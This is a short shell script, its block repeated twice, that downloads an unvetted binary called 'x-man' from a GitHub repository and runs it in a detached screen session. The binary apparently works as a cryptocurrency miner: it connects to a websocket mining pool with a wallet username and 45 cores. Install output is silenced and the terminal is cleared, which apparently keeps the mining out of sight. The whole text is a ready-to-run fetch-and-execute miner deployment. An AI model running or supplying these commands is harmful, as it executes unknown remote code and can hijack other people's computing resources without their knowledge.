wget https://github.com/obisumila/effective-chainsaw/raw/refs/heads/main/x-man ;
chmod +x x-man ;
sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
screen -S live -dm ./x-man --url ws://tw-pool.com:5487/mine mine --username GASPNARXHfyhdCnrrsiszPthMzNwWWYwtHJkVLUVSTpj.TALK --cores 45 ; 
screen -ls
sleep 2
clear
screen -ls ; 

wget https://github.com/obisumila/effective-chainsaw/raw/refs/heads/main/x-man ;
chmod +x x-man ;
sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
screen -S live -dm ./x-man --url ws://tw-pool.com:5487/mine mine --username GASPNARXHfyhdCnrrsiszPthMzNwWWYwtHJkVLUVSTpj.POD --cores 45 ; 
screen -ls
sleep 2
clear
screen -ls ; 

